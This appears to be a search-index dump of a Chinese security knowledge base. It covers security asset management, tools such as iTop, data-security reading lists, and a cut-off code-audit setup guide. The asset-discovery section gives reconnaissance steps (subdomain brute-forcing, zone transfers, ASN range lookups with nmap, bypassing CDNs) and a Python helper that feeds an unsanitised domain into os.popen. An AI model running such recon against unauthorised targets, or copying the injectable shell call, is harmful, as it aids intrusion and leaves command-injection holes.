\u5bf9\u4e8e\u5b89\u5168\u56e2\u961f\uff0c\u6211\u4eec\u6240\u9700\u7684\u8d44\u4ea7\u4e0e\u8fd0\u7ef4\u3001IT\u6240\u9700\u7684\u8d44\u4ea7\u5b58\u5728\u4ea4\u96c6\uff0c\u4f46\u662f\u590d\u7528\u5bf9\u4e8e\u5b89\u5168\u6765\u8bf4\uff0c\u8d44\u4ea7\u4fe1\u606f\u7684\u7ef4\u5ea6\u662f\u4e0d\u591f\u7684\uff0c\u5b89\u5168\u4e00\u822c\u5173\u5fc3\u5982\u4e0b\u8d44\u4ea7\uff1a \u670d\u52a1\u5668\u8d44\u4ea7\uff1a\u64cd\u4f5c\u7cfb\u7edf\u4fe1\u606f\u3001\u670d\u52a1\u4fe1\u606f\u3001\u4e2d\u95f4\u4ef6\u4fe1\u606f\u3001\u7aef\u53e3\u5f00\u653e\u4fe1\u606f\u3001\u2026\u2026 \u7ec8\u7aef\u8d44\u4ea7\uff1a\u64cd\u4f5c\u7cfb\u7edf\u3001\u662f\u5426\u5177\u5907\u57df\u3001\u2026\u2026 \u57df\u540d\u8d44\u4ea7\uff1a\u57df\u540d\u6ce8\u518c\u65f6\u95f4\u3001\u57df\u540d\u8fc7\u671f\u65f6\u95f4\u3001\u57df\u540d\u6ce8\u518c\u624b\u673a\u3001\u57df\u540d\u6ce8\u518c\u90ae\u7bb1\u3001\u2026\u2026 IP\u8d44\u4ea7\uff1aIP\u7f51\u7edc\u6bb5\uff08\u5185\u7f51\u3001\u5916\u7f51\uff09 \u8d26\u53f7\u5bc6\u7801\uff1a\u8fd0\u8425\u7ba1\u7406\u7cfb\u7edf\u8d26\u53f7\u5bc6\u7801\u3001\u7b2c\u4e09\u65b9\u5e94\u7528\u7cfb\u7edf\u3001\u2026\u2026 \u516c\u53f8\u6e90\u4ee3\u7801\uff1a \u6d89\u53ca\u654f\u611f\u4fe1\u606f\u6587\u4ef6\uff1a\u9879\u76ee\u6587\u6863\u3001\u4eba\u529b\u8d44\u6e90\u6587\u6863\u3001\u6218\u7565\u53d1\u5c55\u6587\u6863\u3001\u2026\u2026 \u5176\u5b83\u4fe1\u606f\uff1a \u5f00\u6e90\u8d44\u4ea7\u7ba1\u7406\u8f6f\u4ef6 \u817e\u8baf\uff1a\u84dd\u9cb8 github\u5730\u5740 iTop \u5b98\u7f51\u5730\u5740 \u5b89\u88c5iTop # \u5b89\u88c5php5.6yum\u6e90 yum install epel-release -y rpm -ivh http://rpms.famillecollet.com/enterprise/remi-release-7.rpm yum install httpd.x86_64 httpd-devel.x86_64 mariadb.x86_64 mariadb-server.x86_64 mariadb-devel.x86_64 -y # \u914d\u7f6e\u6570\u636e\u5e93 # \u5b89\u88c5php\u4ee5\u53caphp\u7684\u6269\u5c55 yum install --enablerepo=remi --enablerepo=remi-php56 php.x86_64 php-soap.x86_64 php-xml.x86_64 php-mysqlnd.x86_64 php-gd.x86_64 php-mcrypt.x86_64 php-ldap.x86_64 -y # \u4e0b\u8f7diTop wget https://jaist.dl.sourceforge.net/project/itop/itop/2.5.1/iTop-2.5.1-4123.zip # \u89e3\u538b unzip iTop-2.5.1-4123.zip # \u79fb\u52a8\u5230web\u76ee\u5f55\uff0c\u5e76\u4fee\u6539\u6743\u9650 mv web /var/www/html/ chown -R apache:apache web \u53c2\u8003\u8d44\u6599 iTop\u7cfb\u7edf\u4f7f\u7528\u624b\u518c Snipe-IT \u5f00\u6e90\u8d44\u4ea7\u7ba1\u7406\u7cfb\u7edf \u5b98\u7f51\u5730\u5740 GLPI \u5b98\u7f51\u5730\u5740 \u53c2\u8003\u8d44\u6599 \u5b89\u5168\u8d44\u4ea7\u7ba1\u7406\u4e2d\u5bb9\u6613\u88ab\u5ffd\u89c6\u7684\u51e0\u70b9 \u91d1\u878d\u884c\u4e1a\u5e94\u7528\u578bCMDB\u5efa\u8bbe\u5b9e\u5f55 \u6700\u4f73\u5b9e\u8df5\uff1a\u5e94\u7528CMDB\u5728\u62db\u5546\u94f6\u884c\u7684\u843d\u5730\u6848\u4f8b","title":"\u8d44\u4ea7\u7ba1\u7406"},{"location":"other-security-branch/asset-management/#_1","text":"\u5bf9\u4e8e\u5b89\u5168\u56e2\u961f\uff0c\u6211\u4eec\u6240\u9700\u7684\u8d44\u4ea7\u4e0e\u8fd0\u7ef4\u3001IT\u6240\u9700\u7684\u8d44\u4ea7\u5b58\u5728\u4ea4\u96c6\uff0c\u4f46\u662f\u590d\u7528\u5bf9\u4e8e\u5b89\u5168\u6765\u8bf4\uff0c\u8d44\u4ea7\u4fe1\u606f\u7684\u7ef4\u5ea6\u662f\u4e0d\u591f\u7684\uff0c\u5b89\u5168\u4e00\u822c\u5173\u5fc3\u5982\u4e0b\u8d44\u4ea7\uff1a \u670d\u52a1\u5668\u8d44\u4ea7\uff1a\u64cd\u4f5c\u7cfb\u7edf\u4fe1\u606f\u3001\u670d\u52a1\u4fe1\u606f\u3001\u4e2d\u95f4\u4ef6\u4fe1\u606f\u3001\u7aef\u53e3\u5f00\u653e\u4fe1\u606f\u3001\u2026\u2026 \u7ec8\u7aef\u8d44\u4ea7\uff1a\u64cd\u4f5c\u7cfb\u7edf\u3001\u662f\u5426\u5177\u5907\u57df\u3001\u2026\u2026 \u57df\u540d\u8d44\u4ea7\uff1a\u57df\u540d\u6ce8\u518c\u65f6\u95f4\u3001\u57df\u540d\u8fc7\u671f\u65f6\u95f4\u3001\u57df\u540d\u6ce8\u518c\u624b\u673a\u3001\u57df\u540d\u6ce8\u518c\u90ae\u7bb1\u3001\u2026\u2026 IP\u8d44\u4ea7\uff1aIP\u7f51\u7edc\u6bb5\uff08\u5185\u7f51\u3001\u5916\u7f51\uff09 \u8d26\u53f7\u5bc6\u7801\uff1a\u8fd0\u8425\u7ba1\u7406\u7cfb\u7edf\u8d26\u53f7\u5bc6\u7801\u3001\u7b2c\u4e09\u65b9\u5e94\u7528\u7cfb\u7edf\u3001\u2026\u2026 \u516c\u53f8\u6e90\u4ee3\u7801\uff1a \u6d89\u53ca\u654f\u611f\u4fe1\u606f\u6587\u4ef6\uff1a\u9879\u76ee\u6587\u6863\u3001\u4eba\u529b\u8d44\u6e90\u6587\u6863\u3001\u6218\u7565\u53d1\u5c55\u6587\u6863\u3001\u2026\u2026 \u5176\u5b83\u4fe1\u606f\uff1a","title":"\u8d44\u4ea7\u7ba1\u7406"},{"location":"other-security-branch/asset-management/#_2","text":"","title":"\u5f00\u6e90\u8d44\u4ea7\u7ba1\u7406\u8f6f\u4ef6"},{"location":"other-security-branch/asset-management/#_3","text":"github\u5730\u5740","title":"\u817e\u8baf\uff1a\u84dd\u9cb8"},{"location":"other-security-branch/asset-management/#itop","text":"\u5b98\u7f51\u5730\u5740 \u5b89\u88c5iTop # \u5b89\u88c5php5.6yum\u6e90 yum install epel-release -y rpm -ivh http://rpms.famillecollet.com/enterprise/remi-release-7.rpm yum install httpd.x86_64 httpd-devel.x86_64 mariadb.x86_64 mariadb-server.x86_64 mariadb-devel.x86_64 -y # \u914d\u7f6e\u6570\u636e\u5e93 # \u5b89\u88c5php\u4ee5\u53caphp\u7684\u6269\u5c55 yum install --enablerepo=remi --enablerepo=remi-php56 php.x86_64 php-soap.x86_64 php-xml.x86_64 php-mysqlnd.x86_64 php-gd.x86_64 php-mcrypt.x86_64 php-ldap.x86_64 -y # \u4e0b\u8f7diTop wget https://jaist.dl.sourceforge.net/project/itop/itop/2.5.1/iTop-2.5.1-4123.zip # \u89e3\u538b unzip iTop-2.5.1-4123.zip # \u79fb\u52a8\u5230web\u76ee\u5f55\uff0c\u5e76\u4fee\u6539\u6743\u9650 mv web /var/www/html/ chown -R apache:apache web \u53c2\u8003\u8d44\u6599 iTop\u7cfb\u7edf\u4f7f\u7528\u624b\u518c","title":"iTop"},{"location":"other-security-branch/asset-management/#snipe-it","text":"\u5b98\u7f51\u5730\u5740","title":"Snipe-IT \u5f00\u6e90\u8d44\u4ea7\u7ba1\u7406\u7cfb\u7edf"},{"location":"other-security-branch/asset-management/#glpi","text":"\u5b98\u7f51\u5730\u5740","title":"GLPI"},{"location":"other-security-branch/asset-management/#_4","text":"\u5b89\u5168\u8d44\u4ea7\u7ba1\u7406\u4e2d\u5bb9\u6613\u88ab\u5ffd\u89c6\u7684\u51e0\u70b9 \u91d1\u878d\u884c\u4e1a\u5e94\u7528\u578bCMDB\u5efa\u8bbe\u5b9e\u5f55 \u6700\u4f73\u5b9e\u8df5\uff1a\u5e94\u7528CMDB\u5728\u62db\u5546\u94f6\u884c\u7684\u843d\u5730\u6848\u4f8b","title":"\u53c2\u8003\u8d44\u6599"},{"location":"other-security-branch/asset-management/asset-acquisition/","text":"\u8d44\u4ea7\u7ba1\u7406\u5e73\u53f0 \u8d44\u4ea7\u7ba1\u7406\u5173\u952e\u70b9\u5728\u4e8e\uff1a\u51c6\u786e\u6027\u3001\u5b9e\u65f6\u6027\u3001\u5b8c\u6574\u6027\u8fd93\u4e2a\u7279\u6027\uff08\u53ef\u80fd\u4e0d\u5168\uff0c\u6b22\u8fce\u8865\u5145\uff09\uff1b \u8d44\u4ea7\u5e76\u975e\u5355\u4e00\u7ef4\u5ea6\uff0c\u81ea\u8eab\u5177\u5907\u4e86\u4e1a\u52a1\u5c5e\u6027\u548c\u5b89\u5168\u5c5e\u6027\uff1b-- \u4f55\u827a \u8d44\u4ea7\u5206\u7c7b IP Host\u8d44\u4ea7 \u57df\u540d\u8d44\u4ea7 \u4e1a\u52a1\u7cfb\u7edf\u8d44\u4ea7 \u6743\u9650\u8d44\u4ea7\uff1a\u7528\u6237\uff08\u7b2c\u4e09\u65b9\u7528\u6237\u3001\u540e\u53f0\u7cfb\u7edf\u7528\u6237\uff09\u3001\u7528\u6237\u6743\u9650\u3001\u2026\u2026 \u2026\u2026 \u8d44\u4ea7\u7ba1\u7406\u5206\u7c7b \u9ed1\u76d2\u8d44\u4ea7\u7ba1\u7406 \u767d\u76d2\u8d44\u4ea7\u7ba1\u7406 \u9ed1\u76d2\u8d44\u4ea7\u7ba1\u7406 \u57df\u540d\u8d44\u4ea7 \u4e86\u89e3\u4e3b\u57df\u540d\u4fe1\u606f\uff1b \u4ece\u8bc1\u4e66\u4e2d\u83b7\u53d6\u57df\u540d\u4fe1\u606f\uff1b whois\u67e5\u8be2\uff1b \u5b57\u5178\u83b7\u53d6\u5b50\u57df\u540d\uff1b ''' \u5b50\u57df\u540d\u5b58\u6d3b\u6027\u5224\u65ad ''' def domain_survivability(domain, tmp_file): UA = { user-agent : Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 } try: response = requests.get(domain, verify=True, timeout=3, headers=UA) tmp_file.write(response.url + '\\n') except Exception as e: return DNS\u533a\u57df\u4f20\u8f93\u6f0f\u6d1e\uff1b \u641c\u7d22\u5f15\u64ce\uff0c\u641c\u7d22\u5de5\u5177\uff08shodan\u7b49\uff09\uff1b ASN\uff1a whois -h whois.radb.net -- '-i origin AS111111' | grep -Eo ([0-9.]+){4}/[0-9]+ | uniq nmap --script targets-asn --script-args targets-asn.asn=15169 IP Host\u8d44\u4ea7 \u76f4\u63a5\u83b7\u53d6 \u7ed5\u8fc7CDN\u83b7\u53d6\u771f\u5b9eIP IP\u5b58\u6d3b\u6027\u626b\u63cf\uff1ashodan \u901a\u8fc7\u57df\u540d\u83b7\u53d6IP ''' \u5229\u7528\u6700\u7b80\u5355\u7684ping\u65b9\u5f0f\u6765\u83b7\u53d6\uff0c\u4e0d\u80fd\u7ed5\u8fc7CDN ''' def exec_ping(domain,precision): try: result = os.popen( ping -c 1 %s -t 3 | grep -v PING % domain) # \u6392\u9664\u4e0d\u80fdping\u901a\u7684domain text = result.read() result.close() ip = re.findall(r'\\d+.\\d+.\\d+.\\d+',text)[0] print domain, if precision == yes : precision_ip_attributes(ip) else: get_ip_attributes(ip) except Exception as e: pass \u5176\u5b83\u8d44\u4ea7 \u57fa\u4e8e\u626b\u63cf\u6765\u8fdb\u884c\uff1b \u4eba\u5de5\u8fdb\u884c\u68b3\u7406\uff0c\u7136\u540e\u5b9e\u73b0\u81ea\u52a8\u5316\uff1b \u5b8c\u6574\u7684\u7528\u6237\u6743\u9650\u7ba1\u7406\u7cfb\u7edf\uff1b \u767d\u76d2\u8d44\u4ea7\u7ba1\u7406 \u4e91\u8d44\u4ea7\u7ba1\u7406 \u963f\u91cc\u4e91\u8d44\u4ea7\u7ba1\u7406 ''' \u4ece\u963f\u91cc\u4e91\u83b7\u53d6ECS\u4fe1\u606f ''' def get_ip(result_file,clt): result_file = open(result_file,'a') for i in range(1,20): request = DescribeInstancesRequest.DescribeInstancesRequest() request.set_PageNumber(i) request.set_PageSize(10) request.set_accept_format('json') result = json.loads(clt.do_action_with_exception(request)).get('Instances').get('Instance') # \u5982\u679cresult\u4e0d\u4e3a\u7a7a\u5c31\u5199\u5165result_file\uff0c\u4e3a\u7a7a\u8bc1\u660e\u5df2\u7ecf\u83b7\u53d6\u4e86\u6240\u6709\u7684\u5b9e\u4f8b if result: for key in result: InstanceId = key['InstanceId'] # \u83b7\u53d6\u5b9e\u4f8bID Status = key['Status'] # \u83b7\u53d6\u5f53\u524d\u72b6\u6001 PrivateIP = key['VpcAttributes']['PrivateIpAddress']['IpAddress'][0] # \u79c1\u6709IP PublicIP = key['EipAddress']['IpAddress'] # \u516c\u6709IP SecurityGroup = key['InstanceName'] # \u5b89\u5168\u7ec4 RegionId = key['RegionId'] # \u5730\u533a # Area = 'aliyun' try: result_file.writelines(InstanceId + '\\t' + Status + '\\t' + PrivateIP + '\\t' + PublicIP + '\\t' + SecurityGroup + '\\t' + RegionId + '\\n') except: result_file.writelines(InstanceId + '\\t' + Status + '\\t' + PrivateIP + '\\t' + PublicIP + '\\t' + '' + '\\t' + RegionId + '\\n') else: pass \u4e9a\u9a6c\u900a\u4e91\u8d44\u4ea7\u7ba1\u7406 ''' \u83b7\u53d6aws \u4e91\u4e3b\u673a ip ''' def get_ip(result_file): result_file = open(result_file,'a') ec2 = boto3.resource('ec2','ap-southeast-1',aws_access_key_id = 'AK', aws_secret_access_key = 'SK') instances = ec2.instances.all() for instance in instances: if instance.public_ip_address == None: result_file.writelines(instance.id + '\\t' + ' ' + '\\t' + instance.private_ip_address + '\\n') else: result_file.writelines(instance.id + '\\t' + instance.public_ip_address + '\\t' + instance.private_ip_address + '\\n') \u4e91\u8d44\u4ea7\u7ba1\u7406\u57fa\u672c\u90fd\u662f\u901a\u8fc7API\u8fdb\u884c\u7ba1\u7406\u3002 \u901a\u8fc7CMDB\u7cfb\u7edf\u8fdb\u884c\u83b7\u53d6 \u5229\u7528CMDB\u7cfb\u7edf\u7684API\u8fdb\u884c\u83b7\u53d6\uff1b \u8d44\u4ea7\u8fdb\u884c\u5173\u8054 IP\u4e0e\u57df\u540d\u8d44\u4ea7\u7684\u5173\u8054\uff1b IP\u4e0e\u7aef\u53e3\u8d44\u4ea7\u7684\u5173\u8054\uff1b \u57df\u540d\u7cfb\u7edf\u6743\u9650\u8d44\u4ea7\u7684\u7ba1\u7406\uff1b \u6211\u4eec\u9700\u8981\u5bf9\u5b89\u5168\u7684\u8d44\u4ea7\u7ba1\u7406\u7cfb\u7edf\u8fdb\u884c\u4e00\u4e2a\u597d\u7684\u6570\u636e\u5e93\u8bbe\u8ba1\u65b9\u4fbf\u6570\u636e\u5173\u8054\u67e5\u8be2\uff1b \u53c2\u8003\u8d44\u6599 \u57df\u540d\u4fe1\u606f\u6536\u96c6","title":"\u8d44\u4ea7\u7ba1\u7406\u5e73\u53f0"},{"location":"other-security-branch/asset-management/asset-acquisition/#_1","text":"\u8d44\u4ea7\u7ba1\u7406\u5173\u952e\u70b9\u5728\u4e8e\uff1a\u51c6\u786e\u6027\u3001\u5b9e\u65f6\u6027\u3001\u5b8c\u6574\u6027\u8fd93\u4e2a\u7279\u6027\uff08\u53ef\u80fd\u4e0d\u5168\uff0c\u6b22\u8fce\u8865\u5145\uff09\uff1b \u8d44\u4ea7\u5e76\u975e\u5355\u4e00\u7ef4\u5ea6\uff0c\u81ea\u8eab\u5177\u5907\u4e86\u4e1a\u52a1\u5c5e\u6027\u548c\u5b89\u5168\u5c5e\u6027\uff1b-- \u4f55\u827a","title":"\u8d44\u4ea7\u7ba1\u7406\u5e73\u53f0"},{"location":"other-security-branch/asset-management/asset-acquisition/#_2","text":"IP Host\u8d44\u4ea7 \u57df\u540d\u8d44\u4ea7 \u4e1a\u52a1\u7cfb\u7edf\u8d44\u4ea7 \u6743\u9650\u8d44\u4ea7\uff1a\u7528\u6237\uff08\u7b2c\u4e09\u65b9\u7528\u6237\u3001\u540e\u53f0\u7cfb\u7edf\u7528\u6237\uff09\u3001\u7528\u6237\u6743\u9650\u3001\u2026\u2026 \u2026\u2026","title":"\u8d44\u4ea7\u5206\u7c7b"},{"location":"other-security-branch/asset-management/asset-acquisition/#_3","text":"\u9ed1\u76d2\u8d44\u4ea7\u7ba1\u7406 \u767d\u76d2\u8d44\u4ea7\u7ba1\u7406","title":"\u8d44\u4ea7\u7ba1\u7406\u5206\u7c7b"},{"location":"other-security-branch/asset-management/asset-acquisition/#_4","text":"","title":"\u9ed1\u76d2\u8d44\u4ea7\u7ba1\u7406"},{"location":"other-security-branch/asset-management/asset-acquisition/#_5","text":"\u4e86\u89e3\u4e3b\u57df\u540d\u4fe1\u606f\uff1b \u4ece\u8bc1\u4e66\u4e2d\u83b7\u53d6\u57df\u540d\u4fe1\u606f\uff1b whois\u67e5\u8be2\uff1b \u5b57\u5178\u83b7\u53d6\u5b50\u57df\u540d\uff1b ''' \u5b50\u57df\u540d\u5b58\u6d3b\u6027\u5224\u65ad ''' def domain_survivability(domain, tmp_file): UA = { user-agent : Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 } try: response = requests.get(domain, verify=True, timeout=3, headers=UA) tmp_file.write(response.url + '\\n') except Exception as e: return DNS\u533a\u57df\u4f20\u8f93\u6f0f\u6d1e\uff1b \u641c\u7d22\u5f15\u64ce\uff0c\u641c\u7d22\u5de5\u5177\uff08shodan\u7b49\uff09\uff1b ASN\uff1a whois -h whois.radb.net -- '-i origin AS111111' | grep -Eo ([0-9.]+){4}/[0-9]+ | uniq nmap --script targets-asn --script-args targets-asn.asn=15169","title":"\u57df\u540d\u8d44\u4ea7"},{"location":"other-security-branch/asset-management/asset-acquisition/#iphost","text":"\u76f4\u63a5\u83b7\u53d6 \u7ed5\u8fc7CDN\u83b7\u53d6\u771f\u5b9eIP IP\u5b58\u6d3b\u6027\u626b\u63cf\uff1ashodan \u901a\u8fc7\u57df\u540d\u83b7\u53d6IP ''' \u5229\u7528\u6700\u7b80\u5355\u7684ping\u65b9\u5f0f\u6765\u83b7\u53d6\uff0c\u4e0d\u80fd\u7ed5\u8fc7CDN ''' def exec_ping(domain,precision): try: result = os.popen( ping -c 1 %s -t 3 | grep -v PING % domain) # \u6392\u9664\u4e0d\u80fdping\u901a\u7684domain text = result.read() result.close() ip = re.findall(r'\\d+.\\d+.\\d+.\\d+',text)[0] print domain, if precision == yes : precision_ip_attributes(ip) else: get_ip_attributes(ip) except Exception as e: pass","title":"IP&amp;Host\u8d44\u4ea7"},{"location":"other-security-branch/asset-management/asset-acquisition/#_6","text":"\u57fa\u4e8e\u626b\u63cf\u6765\u8fdb\u884c\uff1b \u4eba\u5de5\u8fdb\u884c\u68b3\u7406\uff0c\u7136\u540e\u5b9e\u73b0\u81ea\u52a8\u5316\uff1b \u5b8c\u6574\u7684\u7528\u6237\u6743\u9650\u7ba1\u7406\u7cfb\u7edf\uff1b","title":"\u5176\u5b83\u8d44\u4ea7"},{"location":"other-security-branch/asset-management/asset-acquisition/#_7","text":"","title":"\u767d\u76d2\u8d44\u4ea7\u7ba1\u7406"},{"location":"other-security-branch/asset-management/asset-acquisition/#_8","text":"\u963f\u91cc\u4e91\u8d44\u4ea7\u7ba1\u7406 ''' \u4ece\u963f\u91cc\u4e91\u83b7\u53d6ECS\u4fe1\u606f ''' def get_ip(result_file,clt): result_file = open(result_file,'a') for i in range(1,20): request = DescribeInstancesRequest.DescribeInstancesRequest() request.set_PageNumber(i) request.set_PageSize(10) request.set_accept_format('json') result = json.loads(clt.do_action_with_exception(request)).get('Instances').get('Instance') # \u5982\u679cresult\u4e0d\u4e3a\u7a7a\u5c31\u5199\u5165result_file\uff0c\u4e3a\u7a7a\u8bc1\u660e\u5df2\u7ecf\u83b7\u53d6\u4e86\u6240\u6709\u7684\u5b9e\u4f8b if result: for key in result: InstanceId = key['InstanceId'] # \u83b7\u53d6\u5b9e\u4f8bID Status = key['Status'] # \u83b7\u53d6\u5f53\u524d\u72b6\u6001 PrivateIP = key['VpcAttributes']['PrivateIpAddress']['IpAddress'][0] # \u79c1\u6709IP PublicIP = key['EipAddress']['IpAddress'] # \u516c\u6709IP SecurityGroup = key['InstanceName'] # \u5b89\u5168\u7ec4 RegionId = key['RegionId'] # \u5730\u533a # Area = 'aliyun' try: result_file.writelines(InstanceId + '\\t' + Status + '\\t' + PrivateIP + '\\t' + PublicIP + '\\t' + SecurityGroup + '\\t' + RegionId + '\\n') except: result_file.writelines(InstanceId + '\\t' + Status + '\\t' + PrivateIP + '\\t' + PublicIP + '\\t' + '' + '\\t' + RegionId + '\\n') else: pass \u4e9a\u9a6c\u900a\u4e91\u8d44\u4ea7\u7ba1\u7406 ''' \u83b7\u53d6aws \u4e91\u4e3b\u673a ip ''' def get_ip(result_file): result_file = open(result_file,'a') ec2 = boto3.resource('ec2','ap-southeast-1',aws_access_key_id = 'AK', aws_secret_access_key = 'SK') instances = ec2.instances.all() for instance in instances: if instance.public_ip_address == None: result_file.writelines(instance.id + '\\t' + ' ' + '\\t' + instance.private_ip_address + '\\n') else: result_file.writelines(instance.id + '\\t' + instance.public_ip_address + '\\t' + instance.private_ip_address + '\\n') \u4e91\u8d44\u4ea7\u7ba1\u7406\u57fa\u672c\u90fd\u662f\u901a\u8fc7API\u8fdb\u884c\u7ba1\u7406\u3002","title":"\u4e91\u8d44\u4ea7\u7ba1\u7406"},{"location":"other-security-branch/asset-management/asset-acquisition/#cmdb","text":"\u5229\u7528CMDB\u7cfb\u7edf\u7684API\u8fdb\u884c\u83b7\u53d6\uff1b","title":"\u901a\u8fc7CMDB\u7cfb\u7edf\u8fdb\u884c\u83b7\u53d6"},{"location":"other-security-branch/asset-management/asset-acquisition/#_9","text":"IP\u4e0e\u57df\u540d\u8d44\u4ea7\u7684\u5173\u8054\uff1b IP\u4e0e\u7aef\u53e3\u8d44\u4ea7\u7684\u5173\u8054\uff1b \u57df\u540d\u7cfb\u7edf\u6743\u9650\u8d44\u4ea7\u7684\u7ba1\u7406\uff1b \u6211\u4eec\u9700\u8981\u5bf9\u5b89\u5168\u7684\u8d44\u4ea7\u7ba1\u7406\u7cfb\u7edf\u8fdb\u884c\u4e00\u4e2a\u597d\u7684\u6570\u636e\u5e93\u8bbe\u8ba1\u65b9\u4fbf\u6570\u636e\u5173\u8054\u67e5\u8be2\uff1b","title":"\u8d44\u4ea7\u8fdb\u884c\u5173\u8054"},{"location":"other-security-branch/asset-management/asset-acquisition/#_10","text":"\u57df\u540d\u4fe1\u606f\u6536\u96c6","title":"\u53c2\u8003\u8d44\u6599"},{"location":"other-security-branch/data-security/","text":"\u6570\u636e\u5b89\u5168 \u53c2\u8003\u8d44\u6599 \u4e92\u8054\u7f51\u4f01\u4e1a\u6570\u636e\u5b89\u5168\u4f53\u7cfb\u5efa\u8bbe-\u8d75\u5f66 \u4e92\u8054\u7f51\u516c\u53f8\u6570\u636e\u5b89\u5168\u4fdd\u62a4\u65b0\u63a2\u7d22-\u6234\u9e4f\u98de \u7f8e\u56e2\u9152\u65c5\u8d77\u6e90\u6570\u636e\u6cbb\u7406\u5e73\u53f0\u7684\u5efa\u8bbe\u4e0e\u5b9e\u8df5 \u7f8e\u56e2\u5c06\u519b\u4ee4\uff1a\u6570\u636e\u5b89\u5168\u5e73\u53f0\u5efa\u8bbe\u5b9e\u8df5 \u91d1\u878d\u4f01\u4e1a\u6570\u636e\u5b89\u5168\u5efa\u8bbe\u5b9e\u8df5\u7cfb\u5217\uff08\u4e00\uff09\u4e00\u7fd4 \u91d1\u878d\u4f01\u4e1a\u6570\u636e\u5b89\u5168\u5efa\u8bbe\u5b9e\u8df5\u7cfb\u5217\uff08\u4e8c\uff09\u4e00\u7fd4 \u4ece\u751f\u4ea7\u5b89\u5168\u4f53\u7cfb\u89c6\u89d2\u770b\u6570\u636e\u5b89\u5168-\u65b9\u5174 \u4f01\u4e1a\u6570\u636e\u5b89\u5168\u5efa\u8bbe\u7684\u7ecf\u5386\u4e0e\u5b9e\u8df5 \u5b9c\u4eba\u8d37\u6570\u636e\u5b89\u5168\u63a2\u7d22 \u675c\u8dc3\u8fdb\uff1a\u6570\u636e\u5b89\u5168\u6cbb\u7406\u7684\u51e0\u4e2a\u57fa\u672c\u95ee\u9898 \u6570\u636e\u5b89\u5168\u7684\u5fc5\u7531\u4e4b\u8def\u2014\u6570\u636e\u5b89\u5168\u6cbb\u7406\uff08\u5b89\u534e\u91d1\u548c\uff09 \u6570\u636e\u5b89\u5168\u6cbb\u7406\u4e2d\u7684\u6570\u636e\u5206\u7ea7\u5206\u7c7b\u5efa\u8bae\uff08\u5b89\u534e\u91d1\u548c\uff09 \u6570\u636e\u5b89\u5168\uff1a\u6570\u636e\u9632\u6cc4\u5bc6\u5efa\u8bbe-\u7eff\u76df \u6d45\u6790\u5546\u4e1a\u94f6\u884c\u6570\u636e\u5b89\u5168\u4fdd\u62a4\u4f53\u7cfb\u5efa\u8bbe\u601d\u8def-\u7eff\u76df \u4e00\u4e2a\u4eba\u7684\u5b89\u5168\u90e8\u4e4b\u5927\u8bdd\u4f01\u4e1a\u6570\u636e\u5b89\u5168\u4fdd\u62a4","title":"\u6570\u636e\u5b89\u5168"},{"location":"other-security-branch/data-security/#_1","text":"","title":"\u6570\u636e\u5b89\u5168"},{"location":"other-security-branch/data-security/#_2","text":"\u4e92\u8054\u7f51\u4f01\u4e1a\u6570\u636e\u5b89\u5168\u4f53\u7cfb\u5efa\u8bbe-\u8d75\u5f66 \u4e92\u8054\u7f51\u516c\u53f8\u6570\u636e\u5b89\u5168\u4fdd\u62a4\u65b0\u63a2\u7d22-\u6234\u9e4f\u98de \u7f8e\u56e2\u9152\u65c5\u8d77\u6e90\u6570\u636e\u6cbb\u7406\u5e73\u53f0\u7684\u5efa\u8bbe\u4e0e\u5b9e\u8df5 \u7f8e\u56e2\u5c06\u519b\u4ee4\uff1a\u6570\u636e\u5b89\u5168\u5e73\u53f0\u5efa\u8bbe\u5b9e\u8df5 \u91d1\u878d\u4f01\u4e1a\u6570\u636e\u5b89\u5168\u5efa\u8bbe\u5b9e\u8df5\u7cfb\u5217\uff08\u4e00\uff09\u4e00\u7fd4 \u91d1\u878d\u4f01\u4e1a\u6570\u636e\u5b89\u5168\u5efa\u8bbe\u5b9e\u8df5\u7cfb\u5217\uff08\u4e8c\uff09\u4e00\u7fd4 \u4ece\u751f\u4ea7\u5b89\u5168\u4f53\u7cfb\u89c6\u89d2\u770b\u6570\u636e\u5b89\u5168-\u65b9\u5174 \u4f01\u4e1a\u6570\u636e\u5b89\u5168\u5efa\u8bbe\u7684\u7ecf\u5386\u4e0e\u5b9e\u8df5 \u5b9c\u4eba\u8d37\u6570\u636e\u5b89\u5168\u63a2\u7d22 \u675c\u8dc3\u8fdb\uff1a\u6570\u636e\u5b89\u5168\u6cbb\u7406\u7684\u51e0\u4e2a\u57fa\u672c\u95ee\u9898 \u6570\u636e\u5b89\u5168\u7684\u5fc5\u7531\u4e4b\u8def\u2014\u6570\u636e\u5b89\u5168\u6cbb\u7406\uff08\u5b89\u534e\u91d1\u548c\uff09 \u6570\u636e\u5b89\u5168\u6cbb\u7406\u4e2d\u7684\u6570\u636e\u5206\u7ea7\u5206\u7c7b\u5efa\u8bae\uff08\u5b89\u534e\u91d1\u548c\uff09 \u6570\u636e\u5b89\u5168\uff1a\u6570\u636e\u9632\u6cc4\u5bc6\u5efa\u8bbe-\u7eff\u76df \u6d45\u6790\u5546\u4e1a\u94f6\u884c\u6570\u636e\u5b89\u5168\u4fdd\u62a4\u4f53\u7cfb\u5efa\u8bbe\u601d\u8def-\u7eff\u76df \u4e00\u4e2a\u4eba\u7684\u5b89\u5168\u90e8\u4e4b\u5927\u8bdd\u4f01\u4e1a\u6570\u636e\u5b89\u5168\u4fdd\u62a4","title":"\u53c2\u8003\u8d44\u6599"},{"location":"other-security-branch/data-security/big-data-security/","text":"\u5927\u6570\u636e\u5b89\u5168 \u53c2\u8003\u8d44\u6599 \u5927\u6570\u636e\u5b89\u5168","title":"\u5927\u6570\u636e\u5b89\u5168"},{"location":"other-security-branch/data-security/big-data-security/#_1","text":"","title":"\u5927\u6570\u636e\u5b89\u5168"},{"location":"other-security-branch/data-security/big-data-security/#_2","text":"\u5927\u6570\u636e\u5b89\u5168","title":"\u53c2\u8003\u8d44\u6599"},{"location":"other-security-branch/devsecops/gjs/","text":"Gitlab+Jenkins+SonarQube \u5b9e\u73b0\u4ee3\u7801\u5ba1\u8ba1\u6307\u5357 \u73af\u5883\u8bf4\u660e \u865a\u62df\u7cfb\u7edf\uff1aCentos7 \u672c\u673a\u7cfb\u7edf\uff1aMac Gitlab\uff1a\u793e\u533a\u724811.10.0 Gitlab-Runner\uff1a11.10.0 SonarQube\uff1a\u793e\u533a\u72487.7 SonarScanner\uff1a3.3.0 Jenkins\uff1a2.174 \u865a\u62df\u673a\u914d\u7f6eGitlab # \u89e3\u51b3\u4f9d\u8d56 yum install 